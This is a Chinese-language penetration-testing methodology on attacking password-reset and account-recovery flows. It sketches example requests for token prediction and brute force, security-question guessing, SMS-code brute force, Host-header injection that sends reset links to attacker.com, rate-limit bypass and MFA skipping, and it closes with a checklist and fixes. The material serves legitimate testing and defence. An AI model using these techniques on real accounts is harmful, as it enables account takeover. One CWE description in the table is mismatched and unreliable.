# 凭证恢复攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的凭证恢复攻击检测与利用流程，帮助发现和利用密码找回、账户恢复等机制中的设计缺陷。

## 1.2 适用范围

本文档适用于所有提供密码找回、账户恢复功能的 Web 应用和移动应用。

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

凭证恢复攻击是指攻击者利用密码找回、账户恢复等机制设计中的缺陷，绕过正常认证流程，非法获取他人账户控制权。

**本质问题**：
- 身份验证逻辑设计缺陷
- 恢复令牌生成/验证不安全
- 安全问题设计薄弱
- 多因素认证绕过

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-640 | 弱密码恢复机制 |
| CWE-641 | 不正确的资源句柄释放 |
| CWE-284 | 访问控制不当 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 密码找回 | 邮箱重置密码 | 令牌可预测/可爆破 |
| 账户恢复 | 安全问题验证 | 问题答案可猜测 |
| 手机验证 | 短信验证码重置 | 验证码可爆破/可绕过 |
| 多因素认证 | 备用码恢复 | 备用码生成不安全 |
| 社交登录 | 绑定关系恢复 | 绑定逻辑缺陷 |
| 客服协助 | 人工账户恢复 | 身份验证流程薄弱 |
| 备用邮箱 | 备用邮箱验证 | 备用邮箱未验证所有权 |

## 2.3 漏洞发现方法

### 2.3.1 黑盒测试

**步骤 1：识别恢复入口**

```
常见入口点：
- 登录页面的"忘记密码"链接
- 账户设置中的"更改密码"
- 登录失败后的恢复提示
- 账户锁定后的解锁流程
```

**步骤 2：分析恢复流程**

```
典型流程：
输入用户名/邮箱 → 选择恢复方式 → 验证身份 → 设置新密码
```

**步骤 3：测试令牌机制**

```bash
# 1. 请求密码重置
POST /api/password/reset
{"email": "victim@example.com"}

# 2. 获取重置令牌（从邮件或响应中）
# 令牌示例：abc123def456

# 3. 测试令牌特性
# - 是否一次性使用
# - 是否有有效期
# - 是否可预测
# - 是否与用户绑定
```

### 2.3.2 白盒测试

**代码审计要点**

```
检查点：
- 令牌生成算法（是否随机）
- 令牌验证逻辑（是否检查用户绑定）
- 令牌存储方式（是否明文）
- 速率限制实现
```

## 2.4 漏洞利用方法

### 2.4.1 令牌预测攻击

```bash
# 场景：重置令牌可预测

# 1. 收集多个有效令牌
# 注册用户 test1@test.com → 获取令牌 T1
# 注册用户 test2@test.com → 获取令牌 T2
# 注册用户 test3@test.com → 获取令牌 T3

# 2. 分析令牌模式
# - 时间相关：timestamp + hash
# - 序列相关：incremental ID
# - 用户相关：hash(email)

# 3. 预测目标用户的令牌
# 根据模式生成 victim@example.com 的令牌

# 4. 使用预测的令牌重置密码
POST /api/password/change
{
    "token": "predicted_token",
    "new_password": "attacker123"
}
```

### 2.4.2 令牌爆破攻击

```bash
# 场景：令牌空间小或无速率限制

# 1. 请求重置（获取目标用户）
POST /api/password/reset
{"email": "victim@example.com"}

# 2. 爆破令牌
for token in {000000..999999}; do
    POST /api/password/change
    {"token": "$token", "new_password": "hacked"}
done
```

### 2.4.3 安全问题攻击

```bash
# 场景：使用安全问题恢复

# 1. 信息收集
# - 社交媒体收集个人信息
# - 公开数据源搜索

# 2. 常见答案测试
POST /api/security/answer
{
    "question": "你的宠物名字？",
    "answer": "咪咪"  # 常见答案
}

# 3. 暴力破解
# 遍历常见答案字典
```

### 2.4.4 短信验证码绕过

```bash
# 场景：短信验证码恢复

# 1. 验证码爆破
POST /api/sms/verify
{
    "phone": "138****1234",
    "code": "123456"  # 尝试 000000-999999
}

# 2. 响应长度分析
# 比较正确和错误验证码的响应长度差异

# 3. 并发绕过速率限制
# 多 IP 同时请求
```

### 2.4.5 主机头注入攻击

```bash
# 场景：密码重置链接生成依赖 Host 头

# 1. 修改 Host 头
POST /api/password/reset
Host: attacker.com

# 2. 受害者点击恶意链接
# 重置链接指向 attacker.com
# 攻击者获取重置令牌
```

## 2.5 漏洞利用绕过方法

### 2.5.1 速率限制绕过

**技巧 1：IP 轮换**

```bash
# 使用代理池
# 每个请求使用不同 IP
```

**技巧 2：参数变换**

```bash
# 改变请求格式
POST /api/password/reset
{"email": "victim@example.com"}

POST /api/password/reset
{"email": "VICTIM@example.com"}  # 大小写变化

POST /api/password/reset
{"email": "victim+test@example.com"}  # Gmail 别名
```

### 2.5.2 邮箱验证绕过

**技巧 3：邮箱格式变异**

```bash
# Gmail 别名绕过
victim@gmail.com
victim+hack@gmail.com
v.i.c.t.i.m@gmail.com

# Outlook 别名
victim@outlook.com
victim@hotmail.com
```

### 2.5.3 多因素认证绕过

**技巧 4：流程跳过**

```bash
# 直接访问重置完成页面
POST /api/password/change/skip-mfa
{"new_password": "hacked"}

# 修改响应
# 将 MFA 验证结果从 false 改为 true
```

---

# 第三部分：附录

## 3.1 凭证恢复测试检查清单

```
□ 重置令牌是否可预测
□ 重置令牌是否一次性使用
□ 重置令牌是否有合理有效期
□ 重置令牌是否与用户绑定
□ 是否有速率限制
□ 安全问题是否可猜测
□ 短信验证码是否可爆破
□ 重置链接是否验证 Host
□ 恢复流程是否可跳过步骤
□ 是否有异常行为检测
```

## 3.2 常用工具

| 工具 | 用途 | 链接 |
|-----|------|------|
| Burp Suite | 请求篡改和重放 | https://portswigger.net/burp |
| Hashcat | 令牌哈希破解 | https://hashcat.net/hashcat/ |
| Python 脚本 | 自定义攻击脚本 | - |

## 3.3 修复建议

1. **强随机令牌** - 使用加密安全的随机数生成器
2. **令牌绑定** - 将令牌与用户 ID、IP、User-Agent 绑定
3. **短有效期** - 令牌有效期不超过 15 分钟
4. **一次性使用** - 令牌使用后立即失效
5. **速率限制** - 限制每用户/每 IP 的请求频率
6. **多因素验证** - 敏感操作需要多重验证
7. **安全通知** - 密码重置时通知用户

---

**参考资源**：
- [OWASP Forgot Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html)
- [PortSwigger - Password Reset Logic Flaws](https://portswigger.net/web-security/authentication/passwords)
